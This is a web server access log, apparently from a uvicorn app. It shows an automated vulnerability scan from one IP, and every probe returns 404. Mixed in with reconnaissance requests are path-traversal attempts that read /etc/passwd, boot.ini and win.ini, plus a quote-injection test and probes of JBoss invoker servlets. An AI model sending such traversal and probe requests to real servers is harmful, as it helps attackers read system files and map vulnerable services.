+INFO:     198.82.145.75:32990 - "GET /VncViewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32996 - "GET // HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33010 - "GET /mdm/web/login.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33022 - "GET /officescan/console/html/common/l10n/l10n.global.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33030 - "GET /webapp/js/UI_String.en-US.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33032 - "GET /webpages/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33046 - "GET /webpages/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33062 - "GET /webpages/login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33076 - "GET /nessus-check/tomcat_error_version.nasl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33090 - "GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33096 - "GET /tightvnc-jviewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33108 - "GET /VncViewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33122 - "GET /spotfire/about.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33132 - "GET /jasperserver-pro/login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33134 - "GET /tos/index.php?user/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33144 - "GET /tos/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33148 - "GET /js/macro_config.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33160 - "GET /brightmail/viewLogin.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33172 - "POST /webui/apps/sdcss HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33176 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33184 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33186 - "GET /index.JSP HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33196 - "GET /idm/login.jsp?lang=en&cntry= HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33198 - "GET /config-browser/showJars.xhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33202 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33208 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33216 - "GET /userportal/webpages/myaccount/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33228 - "GET /webconsole/webpages/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33234 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33244 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33254 - "GET /api/sonicos/is-sslvpn-enabled HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33264 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33270 - "GET /solr/%23 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33278 - "GET /%23 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33288 - "GET //admincp/login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33290 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33292 - "GET /swvm/ConsoleContainer.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33308 - "GET /api2/Localization/SolarWinds.Orion.SamAppOptics.Strings.dll HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33320 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33322 - "GET /Orion/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33334 - "GET /Orion/Login.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33350 - "GET /lem/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33354 - "POST /av-centerd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33368 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33370 - "GET /SilverStream/Meta/Tables/?access-mode=text HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33378 - "GET /stream/0 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33392 - "GET /content/6jnm8tHCOH.mp3 HTTP/1.0" 404 Not Found
+INFO:     198.82.145.75:33396 - "GET /servlet/com.newatlanta.servletexec.JSP10Servlet HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33400 - "GET /servlet/com.newatlanta.servletexec.JSP10Servlet/..%5C..%5Cglobal.asa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33406 - "POST /sawmillcl.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33420 - "GET /sawmillcl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33432 - "POST /sawmill6cl.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33436 - "GET /sawmill6cl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33438 - "POST / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33454 - "GET /?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33470 - "GET /SAPHostControl/?wsdl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33474 - "GET /sapmc/sapmc.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33480 - "GET /search/results.stm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33484 - "GET /apps/zxtm/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33494 - "GET /cgi-bin/client_execute.cgi?tUD=0 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33506 - "GET /wrcontrollite.ssi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33514 - "GET /login1.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33524 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33540 - "GET /login.html?1600 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33548 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33554 - "GET /eyespyfx_large.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33570 - "GET /cgi-bin/guestimage.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33586 - "GET /pda/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33598 - "GET /ivc2/Backup/IVC1/html/index.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33604 - "GET /view/hsrindex.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33606 - "GET /Webcam/webcam.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33620 - "GET /cgi-bin/camctrl.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33626 - "GET /cgi-bin/ctrldirect.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33632 - "GET /user_view_S.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33640 - "GET /ViewerFrame?Mode=Motion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33648 - "GET /app/idxasp.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33660 - "GET /view/index.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33668 - "GET /view/view.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33682 - "GET /main.cgi?next_file=main.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33684 - "GET /view.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33688 - "GET /vncviewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33694 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33706 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33716 - "GET /photo/lang/ENG.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33718 - "GET /1760982823/facts/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33726 - "GET /1760982823/certificate/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33740 - "GET /v2.0/environments/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33746 - "GET /puppet-ca/v1/certificate/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33750 - "GET /puppet/v3/facts/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33754 - "GET /cas/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33766 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33782 - "GET /NmConsole/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33784 - "GET /progs/homepage HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33790 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33794 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33802 - "GET /cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33818 - "GET //perl?-v HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33822 - "GET //perl.exe?-v HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33830 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33832 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33842 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33846 - "GET /owncloud/index.php/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33848 - "GET /login.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33856 - "GET /exchweb/bin/auth/owalogon.asp?url=http://12345678910 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33870 - "GET /otrs/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33872 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33884 - "GET /geoserver/web/?0 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33892 - "GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33898 - "GET /cs/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33908 - "GET /idc/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33916 - "GET //idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33922 - "GET /web-determinations/?CookieSet=true HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33936 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33944 - "GET /sgdadmin/faces/jsp/Version.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33950 - "GET /gateway/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33960 - "GET /portal/page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33972 - "GET /page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33974 - "GET /portal/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33984 - "GET /portal/pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33990 - "GET /portal/pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33998 - "GET /portal/pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34014 - "GET /portal/pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34024 - "GET /portal/pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34030 - "GET /portal/pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34036 - "GET /portal/pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34042 - "GET /portal/pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34048 - "GET /portal/pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34056 - "GET /portal/pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34066 - "GET /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34072 - "GET /pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34080 - "GET /pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34088 - "GET /pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34102 - "GET /pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34118 - "GET /pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34124 - "GET /pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34128 - "GET /pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34140 - "GET /pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34154 - "GET /pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34170 - "GET /pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34176 - "GET /mapviewer/omserver?getv=t HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34178 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34190 - "GET /dndirector/dashboard/Show.dn HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34206 - "GET /dndirector HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34208 - "GET /btmui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34218 - "GET /ords/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34226 - "GET /apex/listenerConfigure HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34232 - "GET /login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34244 - "GET /dwr/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34252 - "GET /login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34256 - "GET /cgi-bin/pub/pki?cmd=serverInfo HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:34274 - "GET /NoviSurvey/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34288 - "GET /Login.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34300 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34306 - "GET /nps/servlet/portal HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34320 - "GET /IDMProv/jsps/help/Help.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34332 - "GET /gwadmin-console/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34334 - "GET /help/contents.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34348 - "GET /manual/ag/contents.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34360 - "GET /baselining/version HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34372 - "GET /nps/servlet/portalservice HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34374 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34388 - "GET /userSession.do?method=getLanguage HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34390 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34398 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34402 - "GET /login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34408 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34422 - "GET //Help.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34430 - "GET /server-manager/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34446 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34450 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34460 - "GET /uddipublic/default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34464 - "GET /uddi/default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34472 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34480 - "GET /sabin/SiteAdmin.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34482 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34488 - "GET /admin/LocalIndex.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34502 - "GET /scmadmin/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34514 - "GET /scmadmin/LocalIndex.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34516 - "GET /reporter/client.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34522 - "GET /index.exp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34528 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34538 - "GET /core/orionSplashScreen.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34550 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34560 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34570 - "GET /mantis/login_page.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34578 - "GET /mantisbt/login_page.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34588 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34600 - "GET /PassTrixMain.cc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34614 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34620 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34632 - "GET /netflow/html/aboutus.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34642 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34644 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34652 - "GET /login.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34658 - "GET /help/introduction/release-notes.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34666 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34672 - "GET /event/index.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34682 - "GET /NCMContainer.cc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34694 - "GET /configurations.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34708 - "GET /index.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34710 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34724 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34736 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34752 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34766 - "GET /smconf.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34778 - "GET /smadmr5.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34782 - "GET /smency.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34784 - "GET /smftypes.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34796 - "GET /smsmvlog.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34802 - "GET /smhelp.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34812 - "GET /smmsg.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34820 - "GET /smtime.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34824 - "GET /smquar.nsf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34828 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34836 - "GET /HNAP1/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34848 - "GET /mve/help/en/inventory/am_about.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34864 - "POST /jsonrpc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34866 - "GET /mainui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34874 - "GET /./WEB-INF/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34890 - "GET /invoker/EJBInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34906 - "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:34922 - "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34926 - "GET %25. HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34936 - "GET /web-console/ServerInfo.jsp%00 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34940 - "GET /NASApp/nessus/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34944 - "GET /interscan/cgi-bin/FtpSave.dll?I'm%20Here HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34954 - "GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34958 - "GET /niet1227993868 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34962 - "GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus' HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34974 - "GET /query.idq?CiTemplate=../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34978 - "GET /niet651685778. HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34984 - "GET /query.idq?CiTemplate=../../../../../winnt/win.ini%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34994 - "GET /niet1614106325.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35000 - "GET /mail/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35008 - "GET /niet828016235.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35016 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35032 - "GET /niet1985474111.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35042 - "GET // HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35046 - "GET /niet1727812761.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35054 - "GET /tsp// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35062 - "GET /niet1056500911.shtm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35068 - "GET /ap// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35078 - "GET /ssp// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35086 - "GET /niet1323819344.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35088 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35102 - "GET /niet1417393758.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35112 - "GET /rcladmin/js/art_i18n/nls/art_i18n.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35116 - "GET /niet251345739.jspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35120 - "GET /rdweb/login/login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35130 - "GET /niet687669026.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35138 - "GET /jts/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35154 - "GET /niet2024345204.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35164 - "GET /albatross/A3Suite HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35170 - "GET /shared/userlogin.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35172 - "GET /niet537206064.php4 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35180 - "GET /trc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35196 - "GET /niet1016672210.php5 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35202 - "GET /aspera/faspex/login/new?local=true HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35212 - "GET /niet811302688.php6 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35214 - "GET // HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35230 - "GET /niet1091010767.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35234 - "GET /remotesupport/rest/productinfo HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35248 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35260 - "GET /SiteScope/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35264 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35278 - "GET /oo/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35294 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35306 - "GET /xmldata?item=all HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35308 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35318 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35326 - "GET /nnm/main HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35328 - "GET /autopass/login_input HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35342 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35350 - "GET /public/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35352 - "GET /com/novell/webaccess/WebAccessUninstall.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35364 - "GET /servlet/webacc?error=webacc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35370 - "GET /portal HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35382 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35398 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35404 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:35420 - "GET /users/sign_in HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35428 - "GET /portal/loginpage.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35438 - "GET /setup HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35442 - "GET /WEB-INF./web.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35454 - "GET /ews/index.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35468 - "GET /_vti_bin/fpcount.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35470 - "GET /goanywhere/auth/Login.xhtml HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
